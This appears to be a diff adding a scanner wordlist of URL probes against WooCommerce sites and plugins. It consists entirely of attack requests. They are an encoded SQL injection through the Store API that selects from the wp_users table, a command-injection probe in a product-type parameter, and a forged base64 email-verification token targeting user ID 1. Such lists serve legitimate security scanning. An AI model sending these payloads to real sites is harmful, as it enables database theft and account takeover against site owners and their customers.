@@ -1,0 +1,7 @@
+/wp-content/plugins/woocommerce/readme.txt
+/wp-content/plugins/woocommerce/includes/admin/meta-boxes/class-wc-meta-box-product-images.php?product-type=;echo
+/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
+/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
+/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
+/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
+/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
